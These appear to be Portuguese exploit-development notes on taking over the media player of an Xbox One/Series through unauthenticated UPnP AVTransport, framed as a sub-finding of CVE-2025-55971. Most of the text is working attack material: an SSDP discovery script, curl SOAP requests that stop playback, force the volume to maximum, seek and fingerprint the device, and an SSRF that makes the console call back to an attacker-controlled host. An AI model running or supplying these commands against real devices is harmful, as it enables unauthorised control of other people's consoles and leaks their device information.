No final da lista, encontramos algo único:
microsoft.com:*:application/vnd.ms-playtoapp;target="ms-playtoapp-xboxmusic":*
microsoft.com:*:application/vnd.ms-playtoapp;target="ms-playtoapp-xboxvideo":*

Isso confirma que o Xbox One expõe handlers específicos para os apps de música e vídeo. Isso explica por que o seu exploit consegue "acordar" o console e forçar a abertura desses aplicativos (App Escape). Você está interagindo diretamente com o ecossistema PlayTo da Microsoft.


Você envia UDP para 239.255.255.250:1900
  payload: M-SEARCH pedindo "upnp:rootdevice"

  ┌── Xbox One recebe, responde com:
  │     ST: upnp:rootdevice
  │     USN: uuid:f59636db-...::upnp:rootdevice
  │     Location: http://192.168.1.29:2869/upnphost/udhisapi.dll?content=uuid:f59636db-...
  │
  ├── Chromecast recebe, também responde (filtrado pelo IP)
  └── Roteador recebe, também responde (filtrado pelo IP)

A cadeia completa:


UPnP sem auth (protocolo)
        ↓
SetAVTransportURI aceito sem autenticação
        ↓
NSPlayer/WMFSDK inicia request para host controlado
        ↓
Takeover do media player — reprodução arbitrária
        ↓
Callback capturado com firmware, UUID, capabilities



O CVE-2025-55971 documenta o AVTransport SSRF genérico em Smart TVs. O que não estava documentado especificamente é:

Confirmação do takeover do NSPlayer na família Xbox One/Series
Captura de NSPlayer/12.00.26100.7813 WMFSDK/12.00.26100.7813 como evidência do controle
O comportamento específico do Xbox — abrir Films & TV, tentar reproduzir, fazer o GET no host controlado

Isso é um sub-achado original dentro do escopo do CVE-2025-55971, aplicado especificamente à família Xbox One/Series com evidências que não existiam publicadas antes.


Achado: PlayStranger — Unauthenticated Media Player Takeover via UPnP AVTransport
  no Xbox One/Series (NSPlayer/WMFSDK)

Mecanismo: Exploração do CVE-2025-55971 no contexto específico
           do Xbox One/Series, resultando em controle total do NSPlayer
           sem autenticação — reprodução de mídia arbitrária,
           callback HTTP para host controlado e vazamento de
           informações de firmware e sessão.

Evidência: NSPlayer/12.00.26100.7813 WMFSDK/12.00.26100.7813
           capturado em callback para 192.168.1.62:8080





modo debug no metasploit

tail -f ~/.msf4/logs/framework.log

udhisapi.dll


http://192.168.1.29:2869/upnphost/udhisapi.dll?content=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08


obter o UID do servico


SSDP discovery primeiro antes de tentar os requests:


USN: uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08::upnp:rootdevice
Location: http://192.168.1.29:2869/upnphost/udhisapi.dll?content=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08


python3 -c "
import socket
msg = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:3\r\nMAN:\"ssdp:discover\"\r\n\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg.encode(), ('239.255.255.250', 1900))
s.settimeout(3)
try:
    while True:
        data, addr = s.recvfrom(1024)
        if addr[0] == '192.168.1.29':
            response = data.decode()
            for line in response.split('\r\n'):
                if 'USN' in line or 'Location' in line or 'location' in line:
                    print(line)
            print('---')
except: pass
"


<!-- 
verificar o que esta rodando no alvo

curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#GetPositionInfo"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetPositionInfo xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
      <InstanceID>0</InstanceID>
    </u:GetPositionInfo>
  </s:Body>
</s:Envelope>' -->


para qualquer midia:

curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:b0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#Stop"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:Stop xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
      <InstanceID>0</InstanceID>
    </u:Stop>
  </s:Body>
</s:Envelope>'










obter fingerpint

# 1. Fingerprinting — descriptor UUID 1 (MediaRenderer)
curl -s "http://192.168.1.29:2869/upnphost/udhisapi.dll?content=uuid:f59636db-9bb8-4a68-a123-c59ab695077d"

# 2. Fingerprinting — descriptor UUID 2 (DIAL)
curl -s "http://192.168.1.29:2869/upnphost/udhisapi.dll?content=uuid:33dfbafd-ed56-4013-92ae-de5bedcad72e"

# 3. SSRF — callback com captura de headers (CVE-2025-55971)
# Terminal 1: python3 /tmp/lab/server.py
# Terminal 2: SetAVTransportURI + Play






MediaRenderer:1



  autmnetar volume

  curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:RenderingControl" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:RenderingControl:1#SetVolume"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">
      <InstanceID>0</InstanceID>
      <Channel>Master</Channel>
      <DesiredVolume>100</DesiredVolume>
    </u:SetVolume>
  </s:Body>
</s:Envelope>'




consultar volume para contra prova

curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:RenderingControl" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:RenderingControl:1#GetVolume"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">
      <InstanceID>0</InstanceID>
      <Channel>Master</Channel>
    </u:GetVolume>
  </s:Body>
</s:Envelope>'





seek necesita retestar
curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#Seek"' \
  -H "Content-Type: text/xml" \
  -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Seek xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><Unit>REL_TIME</Unit><Target>00:00:01</Target></u:Seek></s:Body></s:Envelope>'



ge protocol info

curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:ConnectionManager" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:ConnectionManager:1#GetProtocolInfo"' \
  -H "Content-Type: text/xml" \
  -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:GetProtocolInfo xmlns:u="urn:schemas-upnp-org:service:ConnectionManager:1"/></s:Body></s:Envelope>'

